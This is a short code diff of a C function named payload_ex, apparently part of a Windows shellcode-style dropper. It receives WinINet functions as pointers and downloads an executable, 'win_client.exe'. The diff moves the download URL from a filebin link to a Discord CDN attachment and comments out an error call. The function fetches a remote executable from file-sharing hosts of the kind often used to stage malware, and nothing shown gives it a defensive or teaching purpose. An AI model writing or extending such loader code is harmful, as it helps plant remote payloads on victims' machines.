@@ -40,8 +40,8 @@ typedef void(*finita)(void);
 */
 
 
-void payload_ex(unsigned long long* args){
-    char url[] = "https://filebin.net/50bn0toze2ttk67a/win_client.exe";
+void payload_ex(unsigned long long** args){
+    char url[] = "https://cdn.discordapp.com/attachments/762321594215038985/1166086220154146897/win_client.exe?ex=6549356b&is=6536c06b&hm=ab3edf49d3be8fd415240b11e1bf438494d8a0f8034b180c2d9f376bb94d6b71&";
     // char url[] = "http://ipv4.download.thinkbroadband.com/5MB.zip";
     unsigned short junk[] = L"FileDownload";
     InterOpen InternetOpen = args[0];
@@ -67,7 +67,7 @@ void payload_ex(unsigned long long* args){
     // Open a connection to the URL
     hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
     if (hConnect == NULL) {
-        int c =  GetLastError();
+        // int c =  GetLastError();
         InternetCloseHandle(hInternet);
         return;
     }
